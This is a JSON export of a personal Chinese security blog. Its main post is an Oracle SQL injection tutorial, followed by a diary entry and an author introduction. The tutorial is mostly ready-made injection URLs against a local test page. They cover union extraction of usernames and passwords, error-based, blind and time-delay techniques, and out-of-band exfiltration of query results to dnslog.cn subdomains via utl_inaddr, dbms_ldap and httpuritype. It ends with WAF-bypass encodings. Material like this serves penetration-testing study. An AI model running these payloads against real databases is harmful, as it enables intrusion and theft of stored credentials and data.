{"meta":{"title":"我的小blog","subtitle":"分享自己想分享的","description":"分享生活与知识","author":"Gun97Dt","url":"http://example.com","root":"/"},"pages":[{"title":"分类","date":"2021-06-23T03:12:57.000Z","updated":"2021-06-24T03:48:49.444Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-06-23T03:05:33.000Z","updated":"2021-06-23T16:48:54.591Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"oracle注入","slug":"oracle","date":"2021-06-23T12:15:19.000Z","updated":"2021-06-24T05:09:21.979Z","comments":true,"path":"2021/06/23/oracle/","link":"","permalink":"http://example.com/2021/06/23/oracle/","excerpt":"oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库 数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。","text":"oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库 数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。 数据库实例名与ORACLE_SID虽 然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt平 台，ORACLE_SID还需存在于注册表中。且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。 当前数据库下有N张表 &lt;=&gt; Oracle：当前用户下有N张表 DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。 RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。 CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构 一般oracle数据库安装成功后会创建几个默认用户’sys’、’system’、’public’等。 oracle特性Oracle 数据库的注入不同于其他数据库，如Access 和Mysql，它包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名， 如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名 Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录 oracle 支持– 类型注释，但是不支持;分隔执行多语句，oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle，另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些，语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。 oracle注入中需要注意的一些点 Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。 Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)：例如: 1SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0 Oracle的单行注释符号是–，多行注释符号/**/。 支持的注释符––空格/**/ 判断Oracle数据库1.oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。 利用函数来判断是否oracle数据库 如：and len(‘a’)=1（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。） 也可以通过dual来判断是否为oracle ： 1and (select count(\\*) from dual)&gt;1 -- 1and (select count(\\*) from dual)&gt;0 -- http://127.0.0.1/oracle.php?id=1&#39; and (select count (*) from user_tables)&gt;0-- http://127.0.0.1/oracle.php?id=1&#39; and (select count(*) from all_objects)&gt;0-- 也可以利用：单引号双位数=正确，单引号单位数=错误 的规则。 联合注入步骤 判断闭合，和mysql一样，此处判断为单引号闭合：http://127.0.0.1/oracle.php?id=1&#39;-- 判断字段数：http://127.0.0.1/oracle.php?id=1&#39; order by 4 -- 判断联合注入：http://127.0.0.1/oracle.php?id=-1&#39; union select null,null,null,null from dual-- 判断每个字段的数据类型： 第1个字段为数字型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,null,null,null from dual-- 继续判断第2个字段的数据类型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,2,null,null from dual-- 结合上图可以判断出第2个字段为字符串类型：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,null,null from dual-- 然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,&#39;3&#39;,&#39;4&#39; from dual-- 判断当前数据库的用户：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select sys_context(&#39;userenv&#39;,&#39;current_user&#39;) from dual),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select user from dual),null,null from dual-- 获取当前数据库的版本：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from sys.v_$version where rownum=1),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;Oracle%&#39;),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select version from v$instance),null,null from dual-- 获取操作系统版本：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select banner from v$version where banner like &#39;TNS%&#39;),null,null from dual-- 获取当前数据库名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select * from global_name),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select name from v$database),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select global_name from global_name),null,null from dual-- 获取当时数据库实例名（这里的数据库实例和数据库名是一样的，所以等同于数据库名）：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select instance_name from v$instance),null,null from dual-- 也可以逐个爆破所有的库名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1),null,null from dual-- 第二个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39;),null,null from dual-- 第三个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select owner from all_tables where rownum=1 and owner &lt;&gt;&#39;SYS&#39; and owner &lt;&gt;&#39;OUTLN&#39;),null,null from dual-- 后续以此类推可以不断的去爆破，注意：库名一定要大写 一次性获取当前用户的所有表：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(table_name,&#39;~&#39;) within group(order by 1) from all_tables where owner=&#39;SYSTEM&#39;),null,null from dual-- 也可以依次逐个爆破所有表：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1),null,null from dual-- 第二个：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#39;LOGMNR_SESSION_EVOLVE$&#39;),null,null from dual--后续以此类推可以不断的去爆破，注意：表名一定要大写 获取指定表的字段名：一次性获取指定表的所有字段名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(column_name,&#39;:&#39;) within group(order by 1) from all_tab_columns where table_name=&#39;USERS&#39;),null,null from dual-- 也可以逐个去爆破字段名：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1),null,null from dual-- 第二个字段：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39;),null,null from dual-- 第三个字段：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select column_name from user_tab_columns where table_name=&#39;USERS&#39; and rownum=1 and column_name&lt;&gt;&#39;ID&#39; and column_name&lt;&gt;&#39;UNAME&#39;),null,null from dual-- 依次类推爆破所有的字段名，注意字段名一定要大写。 获取字段的内容：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,&#39;\\&#39;) within group(order by 1) from users),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select null,id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email,null,null from users-- 爆一条数据：http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1),null,null from dual-- http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select CONCAT(uname,pwd) FROM users where rownum=1),null,null from dual-- 在oracle数据库中，concat函数只能连接两个字符串 http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select listagg(id||&#39;:&#39;||uname||&#39;:&#39;||pwd||&#39;:&#39;||email) within group(order by 1) from users where rownum=1 and id&lt;&gt;1),null,null from dual-- oracle报错注入报错方式与mssql一样:使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可） 报错注入的常用的几个函数：utl_inaddr.get_host_name、ctxsys.drithsx.sn、XMLType、dbms_xdb_version.checkin()、bms_xdb_version.makeversioned()、dbms_xdb_version.uncheckout()、dbms_utility.sqlid_to_sqlhash()、ordsys.ord_dicom.getmappingxpath()、ctxsys.ctx_report.token_type()、utl_inaddr.get_host_address()、decode()等。 utl_inaddr.get_host_name( ) ：本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。我们传递的参数是一个sql 语句所以返回的就是语句执行的结果。 用法：utl_inaddr.get_host_name((sql语句)),11g之后，使用此函数的数据库用户需要有访问网络的权限 获取当前用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select user from dual))-- 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;)-- 查看版本：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_name((select banner from sys.v_$version where rownum=1))-- utl_inaddr.get_host_address()函数:原理同上 用法： 1and 1=utl_inaddr.get_host_address((sql语句))-- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address((select user from dual))-- 同样也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;)-- ctxsys.drithsx.sn(): 去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容） 用法：ctxsys.drithsx.sn(1, (sql语句))，该函数在查询关于主题的对应关键词时，会报错显示出第二个参数的结果，这里第二个参数为sql语句，所以报错显示的结果就是sql语句执行后的结果。 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.drithsx.sn(1, (select user from dual))-- ctxsys.ctx_report.token_type()：处理文本的函数，参数错误时会报错。 用法： 1and 1=ctxsys.ctx_report.token_type((sql语句),1)-- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.ctx_report.token_type((select user from dual),1)-- XMLType:环境原因，未能实现。 用法： 123and (select upper(XMLType(chr(60)||chr(58)||(select user from dual(sql语句))||chr(62))) from dual) is not null --select xmltype(&#x27;&lt;:&#x27;||(select user from dual)||&#x27;&gt;&#x27;) from dual XMLType在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。注意url编码 dbms_xdb_version.checkin(): 此函数检入已签出的VCR，并返回新创建版本的资源ID， 用法DBMS_XDB_VERSION.CHECKIN( pathname VARCHAR2) RETURN DBMS_XDB.resid_type; 如果路径名不存在，则会引发异常，返回路径名（pathname） 这里的pathname传入的sql语句，所以报错返回的pathname结果为sql执行的结果值。 用法： 1and (select dbms_xdb_version.checkin((sql语句)) from dual) is not null 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- dbms_xdb_version.makeversioned(): 如果资源不存在，则会引发异。 用法原理与上面的一样： 1and (select dbms_xdb_version.makeversioned((sql语句)) from dual) is not null -- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- dbms_xdb_version.uncheckout(): 用法原理与上面的一样： 1and (select dbms_xdb_version.uncheckout((sql语句l)) from dual) is not null -- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null -- dbms_utility.sqlid_to_sqlhash(): 原理未清楚 用法： 1and (SELECT dbms_utility.sqlid_to_sqlhash((sql语句)) from dual) is not null -- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null -- ordsys.ord_dicom.getmappingxpath(): 环境原因未能实现 用法： 1and 1=ordsys.ord_dicom.getmappingxpath((sql语句),user,user)--， 后面的两个user可有可无，也可以是任意值 例如：and 1=ordsys.ord_dicom.getmappingxpath((select user from dual))– decode(): 这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。 例如当substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据，这说明user的第一个字符为S。 用法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值)， 1and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1/0),0) from dual) -- 代码decode(substr(user,1,1),’S’,(1/0),0)中,substr(user,1,1)=’S’时，就返回(1/0)的值，但是0不能为分母，所以报错！ 查询当前用户名： 判断第一位：http://127.0.0.1/oracle.php?id=1‘’ and 1=(select decode(substr(user,1,1),&#39;S&#39;,(1/0),0) from dual) --，这里页面报错，说明user第一位字符为S http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;T&#39;,(1/0),0) from dual) --，这里不报错说明第一位不是T： 判断第二位：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,2,1),&#39;Y&#39;,(1/0),0) from dual) --：为Y 以此类推。 Instr函数: 也是通过页面的来判断查询的结果是否正确，正确返回正常，不正确返回错误： 用法：and 1=instr((sql语句),’猜测要查询的结果’)– 1and 1=instr((select user from dual),&#x27;SYSTEM&#x27;)-- 判断当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SYSTEM(要大写)&#39;))--，返回正确页面说明是system用户， 也可以逐个字符去判断，只要有一个字符不正确就会返回错误页面，例如： http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;St&#39;))-- http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SY&#39;))-- 布尔盲注盲注可以使用ASCII()，substr()这种通用组合获取数 使用length()函数判断长度，使用ascii()和substr()函数猜解数据， length用法： 1and length((sql语句))=长度-- 判断用户名长度：http://127.0.0.1/oracle.php?id=1&#39; and length((select user from dual))=6-- ascii()和substr()函数猜解数据 用法： 1and ascii(substr((sql语句),1,1))=ascii码值 -- 逐个拆解用户名：http://127.0.0.1/oracle.php?id=1&#39; and ascii(substr((select user from dual),1,1))=83 -- 也可以用直接用substr函数：http://127.0.0.1/oracle.php?id=1&#39; and (select substr(user,1,1)from dual)=&#39;S&#39; -- 注意大小写 延时注入在Oracle延时注入利用过程中需要使用DECODE、DBMS_PIPE.RECEIVE_MESSAGE等函数来延时数据库的处理时间，当然也可以是case，if 等方式。最后测试者可以通过网页的加载时间来判断注入结果。 DECODE函数的使用方法此处不再讨论。 这里主要利用了oracle管道功能接收消息的函数RECEIVE_MESSAGE，实现延时注入。 DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间) DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)表示从RDS管道返回的数据需要等待5秒，一般情况下可以以PUBLIC权限使用该函数。 判断是否有延时注入：http://127.0.0.1/oracle.php?id=1&#39; and 1= dbms_pipe.receive_message(&#39;RDS&#39;, 10)-- 后续步骤需要使用DECODE函数： DECODE(condition,value,dbms_pipe.receive_message(‘RDS’, 5),0)，意思是当condition=value就返回dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待5秒时间，从而达到延时注入的目的。 判断用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual)-- 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=dbms_pipe.receive_message(&#39;aaa&#39;,(decode((select user from dual),&#39;SYSTEM&#39;,3)))-- 如果判断不是就报错： 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=DBMS_PIPE.RECEIVE_MESSAGE(&#39;pyy&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))-- 后续步骤参考前面的步骤即可。 也可以用高耗时操作：例如：(select count(*) from all_objects)：对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。 结合decode猜解用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual)--正确： http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;a&#39;,(select count(*) from all_objects),0) from dual)--错误： 带外攻击OOBOracle的带外注入和DNSLOG很相似，需要使用网络请求的函数进行注入利用，其中可以进行网络请求的函数有UTL_HTTP.REQUEST、UTL_INADDR.GET_HOST_ADDRESS、SYS.DBMS_LDAP.INIT、httpuritype()等。 一般使用 Oracle 发送HTTP或者DNS请求，将查询结果带到请求中，然后监测外网服务器的HTTP和DNS日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度 两种思路： 第一种：使用Oracle发送HTTP请求，相关函数：utl_http.request()，需要自己搭建外网web服务器，并记录请求的日志信息，然后使用utl_http.request()向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测 ，或许这就是Oracle的ssrf。 第二种（DNSlog）：使用Oracle发送DNS请求，相关函数：utl_inaddr.get_host_address()、utl_inaddr.get_host_name()，将查询结果拼接到域名下，并使用DNS记录解析日志。 理解：这两种方式应该对Oracle的版本有要求，应该与utl_inaddr.get_host_name()函数要求一致，11g之后需要网络访问权限。 utl_http.request() :步骤：首先检测函数是否能用，其中函数返回值是请求的返回值。 http://127.0.0.1/oracle.php?id=1&#39; and exists (select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;) --，页面返回正常说明该函数可以使用。 使用方法： 1and utl_http.request(&#x27;http://域名或者ip:端口/&#x27;||(注入的sql语句))=1 -- 其中||放在URL中的时候需要URL编码。切记！！！ 准备监听的主机和端口： 发送请求（获取当前用户名）： 我这里测试没有成功，报错ORA-00904: : invalid identifier，可能是版本问题。 utl_inaddr.get_host_address 用法： 1234and utl_inaddr.get_host_address((sql语句)||&#x27;.dnslog的域名&#x27;)=1 -- 这个页面会报错或者and (select utl_inaddr.get_host_address((sql语句)||&#x27;.dnslog的域名&#x27;) from dual)is not null-- 这个页面不会报错 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and utl_inaddr.get_host_address((select user from dual)||&#39;.x72v9n.dnslog.cn&#39;)=1 -- 页面会报错，但是dnslog成功接收到请求： http://127.0.0.1/oracle.php?id=1&#39;and (select utl_inaddr.get_host_address((select user from dual)||&#39;.mqzr75.dnslog.cn&#39;) from dual)is not null-- 这个页面不会报错，dnslog成功接收请求 sys.dbms_ldap.init()函数 DBMS_LDAP软件包使您可以从LDAP服务器访问数据。 FUNCTIONN INIT(): init()用LDAP服务器初始化会话。这实际上建立了与LDAP服务器的连接。语法:FUNCTION init(hostname IN VARCHAR2,portnum IN PLS_INTEGER)RETURN SESSION; 用法： 1and (select dbms_ldap.init((sql语句)||&#x27;.dnslog的域名&#x27;,80) from dual)is not null-- 查询用户：http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_ldap.init((select user from dual)%7c%7c&#39;.b6kogu.dnslog.cn&#39;,80) from dual)is not null-- 页面会报错，dnslog成功接收请求： httpuritype()函数: 可以创建UriType列，并在其中存储DBURITYPE，XDBURITYPE或HTTPURITYPE的实例。您还可以定义自己的UriType子类型来处理不同的URL协议。 用法： 1and (select httpuritype((sql语句)||&#x27;.dnslog的域名&#x27;).getclob() from dual)is not null-- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39;and (select httpuritype((select user from dual)%7c%7c&#39;.ayh5v3.dnslog.cn&#39;).getclob() from dual)is not null-- 页面会报错，dnslog成功接收请求 Oracle绕过技巧使用hextoraw()及asciistr()搭配UTL_RAW.CAST_TO_VARCHAR2()函数来进行ascii的编码 hextoraw()：十六进制字符串转换为rawSELECT UTL_RAW.CAST_TO_VARCHAR2(hextoraw(“abcdef”)) FROM dual使用rawtohex()来进行ascii的解码 SELECT rawtohex(‘abcdef’) FROM dual下面是一些利用编码绕过的情况 SELECT 1 FROM dual; 正常语句SELECT%0a1%0aFROM%0adual; \\n换行来替代空格SELECT%0b1%0bFROM%0bdual; 使用tab来替换空格SELECT%0c1%0cFROM%0cdual; 使用\\r回车开替换空格SELECT//1//FROM//dual; 多行注释符来替代回车SELECT–%0a1–%0aFROM–%0adual; 单行注释符和换行来替代回车SELECT/!12321SELECT*/1/*!12321AND/FROM/!12321QWE/dual; 使用内联注释符 借用了在MySQL中bypass常用的技巧来做了简单的可行性测试，注释符和换行的搭配使用。 注释符拼接垃圾字符配合换行SQL&gt; select – asdnaso/asdas/ 2 user from–ioasndoiand 3 dual;USERSQLI: 利用waf的通用性特点SQL&gt; select user/!saho/from dual;USER/!SAHO/SQLISQL&gt; 调用函数是可使用空格换行等select ctxsys. drithsx.sn(user,’aa’)from dual; 命令执行未完待续","categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"日记-20210623","slug":"20210623日记","date":"2021-06-22T16:00:00.000Z","updated":"2021-06-23T14:11:57.545Z","comments":true,"path":"2021/06/23/20210623日记/","link":"","permalink":"http://example.com/2021/06/23/20210623%E6%97%A5%E8%AE%B0/","excerpt":"今天是2021年06月23日星期三。 20210623广州这边又下大雨了，我已经离职了，但是我在等新公司的入职通知。 这几天我做了很多决定，我决定了自己的工作方向，我希望以后我不会为我今天所做的决定而后悔。我想要进步，我要不断的学习新的知识和新的技术，所以我原本想找一个学习技术的方向的岗位的，但是入职后发现是偏向于培训的，所以我就又离职了。现在打算去一个新的岗位，然而这个新的岗位的工作内容是跟我上一个岗位是几乎一样的，虽然我不太情愿再做这个方向，但是没有办法，为了生活只能先做着先，毕竟自己太菜了找工作不容易啊。","text":"今天是2021年06月23日星期三。 20210623广州这边又下大雨了，我已经离职了，但是我在等新公司的入职通知。 这几天我做了很多决定，我决定了自己的工作方向，我希望以后我不会为我今天所做的决定而后悔。我想要进步，我要不断的学习新的知识和新的技术，所以我原本想找一个学习技术的方向的岗位的，但是入职后发现是偏向于培训的，所以我就又离职了。现在打算去一个新的岗位，然而这个新的岗位的工作内容是跟我上一个岗位是几乎一样的，虽然我不太情愿再做这个方向，但是没有办法，为了生活只能先做着先，毕竟自己太菜了找工作不容易啊。 当然了，做这个决定我也是无奈，我只能希望通过我自己今后的最大努力去让自己以后不会后悔现在自己所做的这个决定。 说点其他的，我这个人性格有点懒散，不太会主动去学习，都是遇到困难了或者有需求了才会去学习，我真的好像改掉这个不好的性格，我想要学习，我想要进步，希望自己能越来越好吧。","categories":[],"tags":[{"name":"日记","slug":"日记","permalink":"http://example.com/tags/%E6%97%A5%E8%AE%B0/"}]},{"title":"初次见面","slug":"初次见面","date":"2021-06-21T16:00:00.000Z","updated":"2021-06-23T14:06:42.230Z","comments":true,"path":"2021/06/22/初次见面/","link":"","permalink":"http://example.com/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/","excerpt":"大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。","text":"大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。 自我介绍本人是一名白帽子，目前再某安全公司上班。当然啦，我不是什么大神，我也只是一个半路出家的小白。平时喜欢web渗透，但是还有很多地方需要提高，请各位多多指教。","categories":[],"tags":[]}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"},{"name":"日记","slug":"日记","permalink":"http://example.com/tags/%E6%97%A5%E8%AE%B0/"}]}